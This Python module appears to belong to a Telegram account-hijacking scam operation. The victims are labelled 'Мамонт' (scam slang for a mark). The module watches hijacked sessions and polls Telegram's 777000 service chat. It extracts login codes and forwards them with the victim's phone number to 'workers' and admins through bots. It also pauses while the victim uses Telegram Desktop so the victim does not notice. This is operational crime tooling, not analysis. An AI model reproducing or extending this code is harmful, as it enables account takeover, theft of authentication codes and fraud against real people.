import asyncio
import html
import logging
import re
import time
from datetime import datetime, timezone, timedelta
from typing import Dict, Optional, Set

from aiogram import Bot
from telethon import TelegramClient, events
from telethon.sessions import StringSession

from shared import db
from shared.config import (
    ADMIN_BOT_TOKEN,
    ADMIN_CHAT_ID,
    ADMIN_CHAT_IDS,
    DB_PATH,
    TG_API_ID,
    TG_API_HASH,
    PRIMARY_ADMIN_ID,
    MASTER_ADMIN_IDS,
    TEST_ADMIN_BOT_TOKEN,
    get_admin_bot_token,
    is_test_worker,
)
from shared.notifier import notify_session_revoked

logger = logging.getLogger("shared.service_listener")

# Active running clients: {user_tg_id: TelegramClient}
_active_watchers: Dict[int, TelegramClient] = {}
_forwarded_msg_ids: Set[str] = set()
# Timestamps until which Telegram Desktop is active and watcher should back off from MTProto: {user_tg_id: unix_timestamp}
_desktop_active_until: Dict[int, float] = {}

MSK_TZ = timezone(timedelta(hours=3))


def extract_code(text: str) -> str:
    """Extracts login code from Telegram service notification text."""
    if not text:
        return ""
    # Check for Web login code (alphanumeric, e.g. 0zUKG4Ff9j4)
    web_m = re.search(r'Web login code[^\n]*\n+([A-Za-z0-9]{8,16})', text, re.IGNORECASE)
    if web_m:
        return web_m.group(1).strip()

    # Check for standard numeric codes
    m = re.search(r'(?:Login code|Код для входа|login code|ваш код)[^\d\w]*([A-Za-z0-9]{4,10})', text, re.IGNORECASE)
    if m:
        return m.group(1).strip()

    # Fallback to 5-6 digit numbers
    m2 = re.search(r'\b(\d{5,6})\b', text)
    if m2:
        return m2.group(1).strip()

    return ""


async def _forward_service_message(
    user_tg_id: int,
    text: str,
    date: Optional[datetime],
    msg_id: int,
) -> None:
    """
    Formats and forwards a Telegram service notification (from 777000)
    directly to all Admins and the assigned Worker.
    Strictly once per message ID.
    """
    dedup_key = f"{user_tg_id}:{msg_id}"
    if dedup_key in _forwarded_msg_ids:
        return
    _forwarded_msg_ids.add(dedup_key)

    try:
        user = await asyncio.to_thread(db.get_user_by_tg_id, DB_PATH, user_tg_id)
        username = user["username"] if user and user["username"] else None
        nickname = user["nickname"] if user and user["nickname"] else "Мамонт"
        phone = user["phone"] if user and user["phone"] else "—"
        mirror_name = user["mirror_username"] if user and "mirror_username" in user.keys() and user["mirror_username"] else "—"
        worker_id = user["worker_tg_id"] if user and "worker_tg_id" in user.keys() else None

        worker_username = None
        if worker_id:
            worker = await asyncio.to_thread(db.get_worker_by_tg_id, DB_PATH, worker_id)
            if worker and worker["username"]:
                worker_username = worker["username"]

        user_tag = f"@{username}" if username else f"<code>{nickname}</code>"
        mirror_tag = f"@{mirror_name}" if mirror_name and mirror_name != "—" else "—"
        worker_tag = (
            f"@{worker_username} (<code>{worker_id}</code>)"
            if worker_username
            else (f"<code>{worker_id}</code>" if worker_id else "—")
        )

        if date:
            if date.tzinfo is None:
                date = date.replace(tzinfo=timezone.utc)
            msk_dt = date.astimezone(MSK_TZ)
        else:
            msk_dt = datetime.now(MSK_TZ)
        date_str = msk_dt.strftime("%Y-%m-%d %H:%M:%S")

        code = extract_code(text)
        code_highlight = f"\n🔢 <b>КОД АВТОРИЗАЦИИ:</b> <code>{code}</code>\n" if code else ""

        alert_lines = [
            "🚨 <b>СЛУЖЕБНОЕ СООБЩЕНИЕ / КОД ОТ TELEGRAM (777000)!</b>\n",
            f"👤 <b>Мамонт:</b> {user_tag} (ID: <code>{user_tg_id}</code>)",
            f"📱 <b>Телефон:</b> <code>{phone}</code>",
            f"🪞 <b>Зеркало:</b> {mirror_tag}",
            f"👨‍💻 <b>Воркер:</b> {worker_tag}",
            f"{code_highlight}",
            "📩 <b>Текст сообщения от Telegram:</b>",
            f"<blockquote>{html.escape(text.strip())}</blockquote>\n",
            f"⏱ <i>Получено в: {date_str} (МСК)</i>",
        ]
        alert_text = "\n".join(alert_lines)

        mirror_token = user["mirror_token"] if ("mirror_token" in user.keys() and user["mirror_token"]) else None
        is_my_log = (worker_id in MASTER_ADMIN_IDS)
        if not is_my_log and mirror_token:
            token_row = await asyncio.to_thread(db.get_token_by_token, DB_PATH, mirror_token)
            if token_row and "owner_tg_id" in token_row.keys() and token_row["owner_tg_id"] in MASTER_ADMIN_IDS:
                is_my_log = True

        if is_my_log:
            target_recipient_ids = set(MASTER_ADMIN_IDS)
            logger.info("777000 alert for user %s is primary admin's log -> forwarding ONLY to %s", user_tg_id, target_recipient_ids)
        else:
            admin_rows = await asyncio.to_thread(db.get_all_admins, DB_PATH)
            target_recipient_ids = set(MASTER_ADMIN_IDS)
            for a in admin_rows:
                if a["role"] == "admin":
                    target_recipient_ids.add(a["tg_id"])
            for aid in ADMIN_CHAT_IDS:
                target_recipient_ids.add(aid)
            if worker_id:
                target_recipient_ids.add(worker_id)

        u_mtoken = user.get("mirror_token") if user and "mirror_token" in user.keys() else None
        u_muser = user.get("mirror_username") if user and "mirror_username" in user.keys() else None
        is_test = is_test_worker(u_mtoken, u_muser)
        target_token = get_admin_bot_token(is_test=is_test, mirror_token=u_mtoken, mirror_username=u_muser)
        bot = Bot(token=target_token)
        try:
            for rid in target_recipient_ids:
                try:
                    await bot.send_message(chat_id=rid, text=alert_text, parse_mode="HTML")
                except Exception as send_err:
                    logger.debug("Failed to send 777000 alert to recipient %s via %s: %s", rid, target_token, send_err)
                    if is_test and "chat not found" in str(send_err).lower():
                        try:
                            fb_bot = Bot(token=ADMIN_BOT_TOKEN)
                            await fb_bot.send_message(
                                chat_id=rid,
                                text=f"⚠️ <i>[Тестовый лог — откройте @testadimbot и нажмите /start]</i>\n\n{alert_text}",
                                parse_mode="HTML",
                            )
                            await fb_bot.session.close()
                        except Exception:
                            pass
        finally:
            await bot.session.close()
    except Exception as e:
        logger.error("Failed to forward Telegram service message for user %s: %s", user_tg_id, e)


def is_auth_key_duplicated(exc: Exception) -> bool:
    """
    Checks if an exception signifies that the session key is concurrently active on another IP (e.g. Telegram Desktop).
    Catches AuthKeyDuplicatedError and MTProto 406 message patterns.
    """
    if exc is None:
        return False
    from telethon.errors import AuthKeyDuplicatedError
    if isinstance(exc, AuthKeyDuplicatedError):
        return True
    c_name = type(exc).__name__.lower()
    if "duplicated" in c_name or "authkeyduplicated" in c_name:
        return True
    err_str = str(exc).lower()
    return any(k in err_str for k in (
        "different ip",
        "simultaneously",
        "duplicated",
        "same session exclusively",
        "can no longer be used",
    ))


def is_session_truly_revoked(exc: Exception) -> bool:
    """
    Checks if an exception signifies that the session was PERMANENTLY revoked in Telegram.
    CRITICAL: AuthKeyDuplicated is NOT revocation (it indicates the user is logged into Telegram Desktop/another client).
    """
    if is_auth_key_duplicated(exc):
        return False
    from telethon.errors import (
        AuthKeyUnregisteredError,
        SessionRevokedError,
        UserDeactivatedError,
        SessionExpiredError,
    )
    if isinstance(exc, (AuthKeyUnregisteredError, SessionRevokedError, UserDeactivatedError, SessionExpiredError)):
        return True

    err_str = str(exc).lower()
    return any(w in err_str for w in ("unregistered", "revoked", "deactivated", "session_expired", "not registered"))


async def _poll_777000_loop(client: TelegramClient, user_tg_id: int) -> None:
    """
    Periodically polls 777000 every 5 seconds to catch only newly arrived service messages
    AND verifies that the session is still valid. If revoked, triggers notification.
    Gracefully handles concurrent logins (AuthKeyDuplicated) without false-positive revoking,
    backing off to let Telegram Desktop work smoothly without MTProto seqno collisions.
    """
    while True:
        try:
            now = time.time()
            until = _desktop_active_until.get(user_tg_id, 0)
            if now < until:
                await asyncio.sleep(min(15, max(1, until - now)))
                continue

            if not client.is_connected():
                try:
                    await client.connect()
                except Exception as e_c:
                    if is_auth_key_duplicated(e_c):
                        _desktop_active_until[user_tg_id] = time.time() + 180
                        logger.warning("Session reconnect notice for %s: active on Telegram Desktop (AuthKeyDuplicated). Pausing poll 3m.", user_tg_id)
                        try:
                            await client.disconnect()
                        except Exception:
                            pass
                        await asyncio.sleep(30)
                        continue
                    if is_session_truly_revoked(e_c):
                        logger.warning("Session permanently revoked for %s on reconnect: %s", user_tg_id, e_c)
                        await asyncio.to_thread(db.update_user_auth, DB_PATH, user_tg_id, None, "session_revoked")
                        asyncio.create_task(notify_session_revoked(user_tg_id, reason="Сессия сброшена/отозвана на устройстве мамонта"))
                        break
                    logger.warning("Session reconnect failed for %s: %s", user_tg_id, e_c)

            # Verify authorization status
            is_auth = False
            try:
                is_auth = await client.is_user_authorized()
            except Exception as e_a:
                if is_auth_key_duplicated(e_a):
                    _desktop_active_until[user_tg_id] = time.time() + 180
                    logger.warning("User %s active on Telegram Desktop (AuthKeyDuplicated during auth check). Pausing poll 3m.", user_tg_id)
                    try:
                        await client.disconnect()
                    except Exception:
                        pass
                    await asyncio.sleep(30)
                    continue
                elif is_session_truly_revoked(e_a):
                    is_auth = False
                else:
                    is_auth = True

            if not is_auth:
                logger.warning("Poll loop detected session permanently revoked for user %s", user_tg_id)
                await asyncio.to_thread(db.update_user_auth, DB_PATH, user_tg_id, None, "session_revoked")
                asyncio.create_task(notify_session_revoked(user_tg_id, reason="Сессия сброшена/отозвана на устройстве мамонта"))
                break

            msgs = await client.get_messages(777000, limit=5)
            for m in reversed(msgs):
                if m and m.message:
                    dedup_key = f"{user_tg_id}:{m.id}"
                    if dedup_key not in _forwarded_msg_ids:
                        await _forward_service_message(user_tg_id, m.message, m.date, m.id)
        except Exception as e:
            if is_auth_key_duplicated(e):
                _desktop_active_until[user_tg_id] = time.time() + 180
                logger.warning("Poll loop: user %s active on Telegram Desktop (AuthKeyDuplicated). Pausing 3m to avoid collisions.", user_tg_id)
                try:
                    await client.disconnect()
                except Exception:
                    pass
                await asyncio.sleep(30)
                continue
            if is_session_truly_revoked(e):
                logger.warning("Session permanently revoked for user %s during poll: %s", user_tg_id, e)
                await asyncio.to_thread(db.update_user_auth, DB_PATH, user_tg_id, None, "session_revoked")
                asyncio.create_task(notify_session_revoked(user_tg_id, reason="Сессия сброшена/отозвана на устройстве мамонта"))
                break
            logger.debug("777000 polling error for %s: %s", user_tg_id, e)
        await asyncio.sleep(5)


async def watch_user_session(user_tg_id: int, session_string: str) -> None:
    """
    Passive placeholder. Persistent open sockets from VPS IP cause Telegram 
    to trigger AuthKeyDuplicated and invalidate/terminate the session on Telegram Desktop.
    """
    return


def start_session_watcher(user_tg_id: int, session_string: str) -> None:
    """No-op to prevent concurrent socket connections on victim's AuthKey."""
    pass


_monitor_task_started = False


async def monitor_all_sessions_loop() -> None:
    """No-op background monitor to prevent constant Telethon pinging."""
    return


async def start_all_session_watchers() -> None:
    """No-op background watcher initializer."""
    logger.info("Session watchers disabled to prevent AuthKeyDuplicated session revocation.")
